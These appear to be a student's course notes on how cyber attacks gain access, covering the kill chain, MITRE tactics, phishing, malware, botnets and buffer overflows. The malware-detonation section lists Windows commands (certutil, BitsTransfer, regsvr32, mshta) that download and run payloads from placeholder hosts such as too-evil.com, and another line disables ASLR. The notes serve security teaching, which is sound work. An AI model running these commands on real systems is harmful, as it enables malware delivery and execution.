# Gaining access

### Anatomy of a Cyber Attack

**Cyber Kill Chain**
Steps in theorie
1. Recon
    - Reconnaissance
2. Weaponize
    - build malware
3. Deliver
    - send mail with link or attachment (95% of all attacks involve email)
4. Exploit
    - User link or attachment
    - -> from here on Incident Response
5. Install
    - exploit code downloads payload...
6. C&C (Common and control)
    - establish connection with attacker
7. Action
    - actual attack


**MITRE Attack ramework**
Framework (documentation) how attacks happen (in reality) based on "Tactics, Techniques and Procedures" TTPs (https://attack.mitre.org/)

Mitre tactics (phases of an attack)
1. Initial Access
2. Persistence
3. Privilege Escalation
    - usually needed for next steps
4. Discovery
    - discovery of target network
5. Lateral movement
    - spread within target network
6. Collection (of data)
7. Exfiltration
    - transfer data 

other MITRE Techniques (supporting tactics)
1. Execution
2. Defence Evasion
3. Credential Access
4. C&C (Command & Control)



## Ways to get in
- Credential theft
- Social engineering
    - Could lead to credential theft, or user installing malware
- Malware
- Exploitation 

### Credential Theft
Various techniques, tactics and procedures to steal credentails. Big market for stolen credentials. 

General countermeasures: Awareness training, password manager, 2 factor authentication (man-in-the-middle can usually bypass this though), conditional access control


**Pishing**
Phishing is the attempt to obtain sensitive information such as usernames, passwords, and credit card details, for malicious reasons, by disguising as a trustworthy entity in an electronic communication.
Often via emails that forward you to a (malicous) site where user is to enter credentials.
There are tools to test (and actually launcgh?) pishing campains, e.g.: https://getgophish.com  (not used in lab task)


**Smishing**
- pishing via SMS
    - sms with link that refers user to a login page (pishing)
    - sms with link to website that entices user to download malware (e.g. androin app that requires almost all rights)
(SMS protocol has no security measures to verify sender)

**Vishing**
use phone calls to extract info 
for example via voice over IP.
https://voip.ms  -> calls via voice over IP (of course login is needed)

**Leaked databases**
If credentials are found in leaked database, the attackers often try the same credentials for other accounts (as users tend to use same pw for multiple accounts)


**Varia related to credential theft**
- SSL usually doesn't help against pishing as CA's are poor content watchdogs
- Punycode: 
    - codind to allow ASCI characters to display unicode characters
    - Example: https://xn--80aa0cbo65f.com/ ->  https://раураӏ.com/  (depends on browser/app how it is displayed)


### Social engineering
Some notes:

- bypass procedures 
- Bad USB Attack
    - just scatter some usb sticks (with malware etc.). Place them on desk etc..
    - Most will be at some plugged in. And when user clicks on app (or even doc) it can 
    - Some variants:
        - Remote Keyboard that looks like a usb stick -> possible to control pc
        - charger cable for cellphones containing webserver to allow remote access
- Open source intelligence 
    - check social media, google etc.
- etc.

**Some tipps to find infos**
- check metadata (author) of files (e.g. pdf)
- check social media
- etc.

### Malware
Malware is broad definition for software with harmul intent 
- Malware 
    - potentially harmful application (e.g.: Trojan (create backdoor), spambots)
- Ransomware
    - e.g. encryptes data
    - What to do.. immediate measures: 
        1. cut of internet connecion
        2. save backups (if not yet compromised)
            - no connection to compromised network
        3. contact police
        4. get help from external IT team (Security Incident Response Service)
        5. Dont contact attackers (let police and/or external team do it)
- spyware
    - potentially unwanted
- adware
    - potentially unwanted (low risk)

Malware is usually delivered via: 
- E-Mail (most common)
- Web (can be combined with email)
- USB
- stolen credentials
- exposed systems
- supply chain attacks


**Malware detonation (windows)**

Windows has some tools which facilitate running malware:
- CertUtil.exe  (tool to manage certificates)
    - can download certificate (PEM) from url
    - `certutil -urlcache -f <url> malicious1.txt` -> download
    - `certutil -decode malicious1.txt malicious.gzip` decode
- BitsTransfer (Service "Background Intelligent Transfer Service)
    - Service to transfer data between server and client
    - via powershell download file: `Start-BitsTransfer -Source http://bad-server.tld/payload.exe -Destination %APPDATA%/o.exe`
- Msiexec (for msi)
    - to run msi files
    - Advantages: process is msiexec and considered legitimate, payload is in msi file and usually considered clean
- regsvr32.exe (register dll's)
    - File can be downloaded and executed. Example: `regsvr32 /u /s /i:https://too-evil.com/payload.php scrobj.dll`
        - process would be regsvr32, which is usually considered legitimate
- mshta.exe (tool to run hta scripts)
    - HTA scripts are html like applications that can run outside the browsers
    - example: `mshta http://too-evil.com/payload.php` (process will be mshta.exe which is considered legitimate)
- schtasks (Windows task scheduler)
    - Service "Task Scheduler"
    - is not only used to run but also to persist malware


**Sandbox evasion**
Some (many) security solutions use sandboxing to detect malware. Some malware tries to detect sandboxes and (VM evasion/detection) and then behave differently (normal). Ways to detect malware could be: 
- Guest additions (VMWare tools, Vbox Additions), drivers, system ressources, system temparature
- no mouse/keyboard activity, no browser history, process, number of installed apps ...etc.

Once a malware detects a virtualized environment, it changes it's behavior or exits.


**Botnet Communication**
Infected machines ("bots") will ask botnet server (C&C) which tells bot what to do.
Any protocol can be used (theoretically): HTTP/HTTPS, DNS, P2P, etc.
Configuration of bot can be static or dynamic (meaning: is downloaded from C&C)


Varia: 
- Domain Generation Algorithm - DGA (see pdf)
- FastFlux Network (see pdf)
    - usually one or more Domain names for C&C servers
- P2P Network (see pdf)
    - Hierarchie for C&C servers (super-nodes)


Countermeasures (reactiv or proactive)
- riskmgm (proactive)
- tooling (proactive)
- awarness campain (proactive)
- blocking (reactiv or proactive)
- takedown (e.g. domain)
    - e.g. tell provider
- sinkholing
    - direct traffic of C&C to a server to a) learn about botnet and b) prevent communication
- ....

### Exploitation (of vulnerabilities)
Using existing apps (and there vulnerabilities) to introduce additional (malicious) code (remote code execution)

Vulnerability classes
- Memory Corruption
- Injection Attacks
- Deserialization issues
    - deserialization often calls constructors (possibility to introduce code)
    - also see web lab task with java
- Information Disclosure
- Misconfiguration

Type of attacks
- Local exploit
    - escalate permissions
- server-side exploit
    - access webserver from remote (e.g. sql injection)
- client exploit
    - client accesses some "evil" machine/code/website (etc.) and due to a vulnerability remote code can be executed

**Memory corruption**
Often called buffer overflow. Programms developped in unsafe programming languages such as C or C++ are vulnerable to memory corruption. 



Types
- Variable overflow
- SIP Overwrite
- Shellcode execution
    - instead of just giving the SIP a new address to resume execution, the code triggers the shell and the passed arguments (*password) is the shell code to be executed

Basic example (also see pdf - especially for stack layout - and lab tasks): 
```
void handleData(char *password) {
    int isAdmin = 0;  // 2 bytes on stack
    char msg[16]; // 16 bytes on stack
    isAdmin = checkPw(password);
    sprintf(msg, "Password %s", password); // will write "Password" + passed param into msg on stack. If it's too big it will overwrite isAdmin variable on stack and if it is even bigger it will overwrite SIP (return address)
    if(admin){
        // do something...
    }
}
```

Repetition and varia: 
- Stack grows down (towards 0 address), but writes go up (thats way buffer overflow in examples works)
- Little Endian used in intel: 0xAABBCCDD -> is ordered in memory DD CC BB AA (unintuitive)
- SIP Stored Instruction pointer (memory address on stack where execution should continue when stack frame is discarded, aka method returns)
- in C, 0 is usually false (and any other value than 0 is true)
- use python to generate strings of arbitrary length: `python -c 'print("A"*132)'` (and then call "exeFile `python -c 'print("A"*132)'`")
- ASLR (Address Space Layout Randomization) will have to be disabled on live-cd for memory exercises: `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space` (see lab tasks, will be reenabled after every reboot)
- also see excel: "AssemblyAndStack.xlsx"

**Varia**
- Command & Control
    - Often initial exploit is used to connect to a C&C server later (often reverse shell). 
- Metasploit: Penetration testing framework
    - see separate md file and lab tasks

## Varia/leftovers

- APT Advanced Persistent Threat
    - usually stay long in the network. (one has to understand the attack fully before responding to an ATP attack)
    - some names: CozyBear, FancyBear
- Blue team: Monitoring and incident response (basically defends attacks)
- Red team: pretends to be an attacker: trains the blue team
    - Test resilience against real attacks
- Purple team: basically blue and red team teaming up
- Incident response: Prepare, Identify, Contain, Eradicate, Recover, Lessons learned (in reality all happens more or less at once)
- Audit/Pentest: gain overview of vulnerabilities
